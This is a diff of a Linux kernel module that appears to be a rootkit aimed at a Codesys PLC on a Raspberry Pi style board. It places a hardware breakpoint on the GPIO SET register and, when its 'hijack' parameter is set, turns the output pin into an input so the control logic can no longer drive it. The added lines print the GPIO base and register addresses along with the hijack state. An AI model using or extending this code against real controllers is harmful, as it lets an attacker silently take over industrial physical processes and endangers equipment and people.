@@ -27,10 +27,8 @@ MODULE_PARM_DESC(hijack, "Hijack the control"); // 1=Yes, 0=No
 #define GPIO_PULL *(gpio+37)
 #define GPIO_PULLCLK0 *(gpio+38)
 
-static void dr_handler(struct perf_event *bp,
-                               struct perf_sample_data *data,
-                               struct pt_regs *regs) {
-	// Here I can access gpio Codesys address
+static void dr_handler(struct perf_event *bp, struct perf_sample_data *data, struct pt_regs *regs) {
+
 	if (hijack == 1) {
 		INP_GPIO(g); // Set LED pin as input, so the logic could not write anymore
 		printk(KERN_INFO "[RK] Hijacked!\n");
@@ -53,6 +51,10 @@ static int hw_break_module_init(void) {
 	}
 	gpio = (unsigned *)l; // GPIO base
 	set_p = (l+(long)0x1C); // Offset of SET register
+
+	printk(KERN_INFO "[RK] GPIO Base address: %x %s %lu\n", (unsigned)gpio, gpioB, l);
+	printk(KERN_INFO "[RK] GPIO SET Register: 0x%lx\n", set_p);
+	printk(KERN_INFO "[RK] Hijack: %d\n", hijack);
 
 	hw_breakpoint_init(&attr);
 	attr.bp_addr = set_p; // Monitor SET register
